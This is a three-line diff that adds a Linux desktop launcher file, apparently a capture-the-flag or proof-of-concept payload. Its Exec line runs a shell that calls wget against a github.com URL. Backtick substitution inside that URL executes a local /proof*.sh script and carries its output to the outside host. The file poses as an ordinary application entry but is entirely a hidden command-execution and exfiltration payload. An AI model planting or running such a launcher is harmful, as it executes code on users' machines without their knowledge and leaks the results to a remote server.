@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget https://github.com/CyberSecurity2045/CTF.git/?`/proof*.sh`"
+Type=Application
